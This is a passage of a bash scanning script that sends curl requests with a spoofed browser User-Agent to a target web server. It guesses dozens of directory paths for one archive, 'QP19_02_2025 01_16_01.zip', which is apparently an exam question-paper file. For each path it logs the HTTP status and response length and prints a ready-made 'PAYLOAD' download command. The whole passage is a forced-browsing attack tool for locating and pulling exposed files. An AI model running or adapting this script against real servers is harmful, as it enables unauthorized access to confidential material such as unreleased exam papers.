code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPService/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P_Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P_Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPServiceDataSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPServiceDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPServiceDataSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QPBFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QPBFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing-QPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing-QPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QPUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QPUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadQPManager/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadQPManager/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFileSync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFileSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFileSync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BulkUploadQPFile/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BulkUploadQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BulkUploadQPFile/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Panel/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Panel/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-Admin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-Admin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing-Module/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing-Module/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt_QPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt_QPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFileOps/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFileOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFileOps/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QP/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QP/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QuestionPaper_Sync/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QuestionPaper_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QuestionPaper_Sync/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessor-QPBulk/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessor-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessor-QPBulk/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Automation_QPCloud/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Automation_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Automation_QPCloud/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PortalQPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PortalQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PortalQPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-DataUpload/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-DataUpload/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService-QPB/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService-QPB/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling_QPMaster/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling_QPMaster/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPCloud_HandlingModule/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPCloud_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPCloud_HandlingModule/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin_QPAdmin/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin_QPAdmin/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-Mgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-Mgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMgmt_Platform/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMgmt_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMgmt_Platform/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingQPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingQPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_Tool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_Tool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Mgmt-QPMgmt/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Mgmt-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Mgmt-QPMgmt/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handling-Q_P/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handling-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handling-Q_P/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
